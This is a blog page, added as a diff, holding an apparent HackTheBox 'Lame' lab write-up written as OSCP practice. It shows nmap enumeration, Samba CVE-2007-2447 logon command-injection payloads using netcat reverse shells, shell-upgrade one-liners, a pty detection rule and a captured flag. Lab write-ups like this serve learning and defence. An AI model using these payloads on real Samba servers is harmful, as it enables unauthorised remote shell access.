@@ -1,0 +1,394 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>HTB_Lame | HackThe4O4</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="LameNmap &amp; smbclient first we need to know what the Machines open service  IP 10.129.108.1  OS Parrot  nmap -sV -Pn -A -sC 10.129.108.1  nmap -p 1-65535 -T4 -A -v 10.129.108.1        Now we can se">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB_Lame">
+<meta property="og:url" content="https://no-flag.com/2024/12/21/Lame/index.html">
+<meta property="og:site_name" content="HackThe4O4">
+<meta property="og:description" content="LameNmap &amp; smbclient first we need to know what the Machines open service  IP 10.129.108.1  OS Parrot  nmap -sV -Pn -A -sC 10.129.108.1  nmap -p 1-65535 -T4 -A -v 10.129.108.1        Now we can se">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_1.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_2.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_3.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_4.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_5.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_6.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_7.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_8.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_9.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_10.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_11.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_12.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_13.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_14.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_15.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_16.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_17.png">
+<meta property="og:image" content="https://no-flag.com/img/lame_Untitled_18.png">
+<meta property="article:published_time" content="2024-12-21T12:32:07.086Z">
+<meta property="article:modified_time" content="2024-03-02T09:31:16.866Z">
+<meta property="article:author" content="Noflag">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://no-flag.com/img/lame_Untitled.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+	<!-- If needed, replace your own web font service -->
+  <link href="https://fonts.googleapis.com/css?family=Crimson+Text:400,700|Inconsolata|Oswald" rel="stylesheet" />
+
+  
+   
+  
+<link rel="stylesheet" href="/icomoon/style.css">
+
+  
+<link rel="stylesheet" href="/style.css">
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div class="site-wrapper is_post_page">
+    <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+<script>document.getElementById("loading-bar").style.width="20%";</script>
+
+
+<header id="header" class="site-header clearfix">
+
+  <a class="logo square clearfix" href="/">
+    <!-- 
+      Replace with your own size name, for example:
+      <span class="b">A</span>
+      <span class="w">B</span>
+      <span class="b">C</span>
+     -->
+     <span class="b">A</span>
+     <span class="b">R</span>
+     <span class="b">T</span>
+     <span class="w">I</span>
+     <span class="w">F</span>
+     <span class="b">A</span>
+     <span class="b">C</span>
+     <span class="b">T</span>
+  </a>
+  <a class="me square site-nav-switch clearfix">
+    <span class="b">
+    	<span class="icon icon-menu"></span>
+    </span>
+  </a>
+
+</header>
+
+    <script>document.getElementById("loading-bar").style.width="40%";</script>
+    <main id="main" class="clearfix">
+      <article id="Lame-Lame"
+  class="article white-box article-type-Lame"
+  itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    <h1 class="article-title" itemprop="name">
+      HTB_Lame
+    </h1>
+    <div class="article-meta">
+      Posted on 
+      <time class="article-time" datetime="2024-12-21T12:32:07.086Z" itemprop="datePublished">
+        Dec 21, 2024
+      </time>
+    </div>
+  </header>
+
+  <div class="article-entry" itemprop="articleBody">
+    <h1 id="Lame"><a href="#Lame" class="headerlink" title="Lame"></a>Lame</h1><p><a target="_blank" rel="noopener" href="https://hackmd.io/@SY-T/rkVBbdxa6">Nmap &amp; smbclient</a></p>
+<p>first we need to know what the Machines open service</p>
+<ul>
+<li><p>IP 10.129.108.1</p>
+</li>
+<li><p>OS Parrot</p>
+</li>
+<li><p>nmap -sV -Pn -A -sC 10.129.108.1</p>
+</li>
+<li><p>nmap -p 1-65535 -T4 -A -v 10.129.108.1</p>
+</li>
+</ul>
+<p><img src="/img/lame_Untitled.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_1.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_2.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_3.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_4.png" alt="Untitled"></p>
+<p>Now we can see the open port is:</p>
+<ul>
+<li>21&#x2F;tcp vsftpd 2.3.4 ftp service</li>
+<li>22&#x2F;tcp Openssh 4.7p1 Debian 8ubuntu1 (protocol 2.0) SSH</li>
+<li>445&#x2F;tcp Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)  netbios-ssn</li>
+</ul>
+<p>One of the FTP services allows guests to login</p>
+<p><img src="/img/lame_Untitled_5.png" alt="Untitled"></p>
+<p>So I try using anonymous login FTP service，but the content is empty</p>
+<p><img src="/img/lame_Untitled_6.png" alt="Untitled"></p>
+<p>Then I decided to look for vulnerabilities in this service version</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49757">Offensive Security’s Exploit Database Archive</a></p>
+<p>The exploit-db  platform has seen this version of the vulnerability message </p>
+<p>And the vulnerability is <code>CVE-2011-2523</code></p>
+<p>But I find some problem, this CVE cannot be used here, becouse I use the more exploit to try this CVE, So I guess “this topic” should not apply to this vulnerability</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://vulners.com/nmap/NMAP:FTP-VSFTPD-BACKDOOR.NSE">https://vulners.com/nmap/NMAP:FTP-VSFTPD-BACKDOOR.NSE</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/nobodyatall648/CVE-2011-2523">https://github.com/nobodyatall648/CVE-2011-2523</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/0xSojalSec/-CVE-2011-2523">https://github.com/0xSojalSec/-CVE-2011-2523</a></li>
+</ul>
+<p>Back to what I said earlier, in addition to FTP services, there are also SSH and SMB services</p>
+<p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/vulnerability-list/vendor_id-97/product_id-585/version_id-430455/Openbsd-Openssh-4.7p1.html">Openbsd Openssh version 4.7p1 : Security vulnerabilities</a></p>
+<p>After searching for vulnerabilities in this version of SSH, I found no exploitable vulnerabilities, so I directly tested the SMB service</p>
+<p>The SMB service has two ports opened</p>
+<p><img src="/img/lame_Untitled_7.png" alt="Untitled"></p>
+<p>When I browsed the exploit-db platform again, I found a lot of exploitable vulnerability information after looking for the Samba service. Among them, the 445 port targeted the vulnerability of smbd 3.0.20, and I also saw this vulnerability exploit information in the platform list.</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/16320">Offensive Security’s Exploit Database Archive</a></p>
+<p><img src="/img/lame_Untitled_8.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_9.png" alt="Untitled"></p>
+<p>You can see that the CVE number is 2007-2447</p>
+<p><a target="_blank" rel="noopener" href="https://www.samba.org/samba/security/CVE-2007-2447.html">Samba - Security Announcement Archive</a></p>
+<p>The exploit needs to import the suite first from smb.SMBConnection import SMBConnection</p>
+<p>So you have to download the smb for python3 first. If you use the pysmb tool, it will always report an error (for online HTB machines)</p>
+<ul>
+<li>sudo apt install python3-smb</li>
+</ul>
+<p>Because the During the OSCP exam  we can’t use MSF tool to help us complete the topic</p>
+<p>Use the exploit is the good choose, but this doesn’t work for me</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/amriunix/CVE-2007-2447">https://github.com/amriunix/CVE-2007-2447</a></p>
+<p>So I decided not to test this way</p>
+<p>(Here I changed the IP)</p>
+<p>first I want to know the smb service if I use Anonymous identity to login the SMB it can be access?</p>
+<p><img src="/img/lame_Untitled_10.png" alt="Untitled"></p>
+<p>as i guessed</p>
+<p>The smb exploit</p>
+<ul>
+<li>logon “&#x2F;&#x3D;<code>nc ‘tun0 interface IP’ 4444 -e /bin/bash</code>”</li>
+</ul>
+<p><img src="/img/lame_Untitled_11.png" alt="Untitled"></p>
+<p><img src="/img/lame_Untitled_12.png" alt="Untitled"></p>
+<p>I think this method is Failed</p>
+<p>So want to try other payload</p>
+<p><a target="_blank" rel="noopener" href="https://oscp.infosecsanyam.in/untitled/smb-enumeration">SMB Enumeration</a></p>
+<ul>
+<li><p>logon “.&#x2F;&#x3D;<code>nohup nc -e /bin/sh LHOST LPORT</code>“</p>
+<p>  <img src="/img/lame_Untitled_13.png" alt="Untitled"></p>
+</li>
+</ul>
+<p>when I use this payload, the nc well return the <strong>connect to [10.10.14.9] from (UNKNOWN) [10.129.109.152] 39109</strong> message to me</p>
+<p><img src="/img/lame_Untitled_14.png" alt="Untitled"></p>
+<p>So I decide to try some command under nc</p>
+<p><img src="/img/lame_Untitled_15.png" alt="Untitled"></p>
+<p>In order to be fully interactive in this simple reverse shell environment, I use the interactive terminal generated by Python</p>
+<ul>
+<li><p>TTY</p>
+<p>  There a command exists called <strong>tty</strong> which displays information related to <strong>terminal</strong>. The <strong>tty</strong>  command of terminal basically prints the file name of the terminal connected to standard input. <strong>tty</strong> is short of teletype, but popularly known as a terminal it allows you to interact with the system by passing on the data (you input) to the system, and displaying the output produced by the system.</p>
+<p>  <a target="_blank" rel="noopener" href="https://ppfocus.com/0/teae6b945.html">Spawning A TTY Shell-逃逸 Linux 各種 Shell 來執行命令 - 人人焦點</a></p>
+</li>
+</ul>
+<p>Attackers may upgrade a simple reverse shell to a fully interactive <code>tty</code> after obtaining initial access to a host.</p>
+<p><strong>Spawning a TTY Shell</strong></p>
+<ul>
+<li>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;sh”)’</li>
+<li>echo os.system(‘&#x2F;bin&#x2F;bash’)</li>
+<li>&#x2F;bin&#x2F;sh -i</li>
+<li>perl —e ‘exec “&#x2F;bin&#x2F;sh”;’</li>
+<li>perl: exec “&#x2F;bin&#x2F;sh”;</li>
+<li>ruby: exec “&#x2F;bin&#x2F;sh”</li>
+<li>lua: os.execute(‘&#x2F;bin&#x2F;sh’)</li>
+<li>exec “&#x2F;bin&#x2F;sh”</li>
+</ul>
+<p><img src="/img/lame_Untitled_16.png" alt="Untitled"></p>
+<h3 id="Rule-query"><a href="#Rule-query" class="headerlink" title="Rule query"></a>Rule query</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">event.action:executed and process.name:python and</span><br><span class="line">process.args:(&quot;import pty; pty.spawn(\&quot;/bin/sh\&quot;)&quot; or &quot;import pty;</span><br><span class="line">pty.spawn(\&quot;/bin/dash\&quot;)&quot; or &quot;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>when I execution python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;sh”)’ </p>
+<p>I well got the fully interactive, it let me easy to operate</p>
+<p><img src="/img/lame_Untitled_17.png" alt="Untitled"></p>
+<ul>
+<li>cat &#x2F;root&#x2F;root.txt ⇒ ffed091dd44f75f11cb90d85bb1ca752</li>
+</ul>
+<p><img src="/img/lame_Untitled_18.png" alt="Untitled"></p>
+<p>To be honest, I searched for flag’s file for a long time, because it doesn’t have a fixed file name and location.</p>
+
+  </div>
+  
+  <div class="article-tags">
+    
+  </div>
+
+  
+
+</article>
+
+      <script>document.getElementById("loading-bar").style.width="60%";</script>
+    </main>
+    
+<footer id="footer" class="clearfix">
+	
+  <div>&copy; <a href="https://no-flag.com">HackThe4O4</a> Theme by <a href="http://artifact.me/" target="_blank">Art Chen</a>.</div>
+  <div>Powered by <a target="_blank" href="https://hexo.io/" rel="external noopener">Hexo</a>.</div>
+</footer>
+
+
+    <script>document.getElementById("loading-bar").style.width="80%";</script>
+    <div class="overlay"></div>
+  </div>
+  <div class="site-sidebar">
+
+	
+	
+	<div class="sidebar-switch clearfix "
+		style="display: none">
+		<a class="dark-btn active" data-toggle="toc">
+	    <span class="icon icon-list"></span>
+	    <span class="text">Index</span>
+	  </a>
+	  <a class="dark-btn" data-toggle="bio">
+	    <span class="icon icon-person"></span>
+	    <span class="text">Bio</span>
+	  </a>
+	</div>
+
+	<div class="site-toc "
+		style="display: none">
+		
+	    <div class="no-index">No Index</div>
+	  
+  </div>
+  
+	<div class="site-bio show"
+		style="display: block">
+		
+	  <!-- About Me -->
+	  <div class="about-me clearfix">
+	    <div class="avatar">
+	      <img src="/img/avatar.png" />
+	    </div>
+	    <div class="info">
+	      <a class="name dark-btn" href="/about">
+	        Noflag
+	      </a>
+	    </div>
+	    <div class="info">
+	      <span class="item desc">
+	        Documenting the journey of cyber security
+	      </span>
+	    </div>
+	  </div>
+	
+	  <!-- Social Icons -->
+	  <div class="social clearfix">
+	    
+	      
+	        <a href="/atom.xml" class="feed"
+	          target="_blank" rel="external">
+	          <span class="icon icon-feed"></span>
+	        </a>
+	      
+	        <a href="https://github.com/artchen" class="github"
+	          target="_blank" rel="external">
+	          <span class="icon icon-github"></span>
+	        </a>
+	      
+	    
+	  </div>
+
+	</div>
+
+	<div class="shortcuts">
+		<a href="#header" class="top window-nav dark-btn" id="go-top">
+			<span class="icon icon-chevron-thin-up"></span>
+		</a>
+		<a class="close dark-btn" id="sidebar-close">
+			<span class="icon icon-close"></span>
+		</a>
+		<a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+			<span class="icon icon-chevron-thin-down"></span>
+		</a>
+	</div>
+
+</div>
+
+  <!-- Universal Search -->
+
+<script type="text/javascript">
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var BAIDU_API_ID = "";
+  var SEARCH_SERVICE = "google";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.js"><\/script>')</script>
+
+
+<script src="/js/search.js"></script>
+
+
+<script src="/js/app.js"></script>
+
+
+<!-- Disqus -->
+
+
+
+<!-- Valine -->
+
+
+<!-- Swiftype -->
+<!-- Please replace with your own swiftype settings -->
+<!--
+<script type="text/javascript">
+  /* Swiftype */
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','FHMeAyBdVccJECstf-XJ','2.0.0');
+</script>
+-->
+
+  <script>document.getElementById("loading-bar").style.width="100%";</script>
+</body>
+</html>
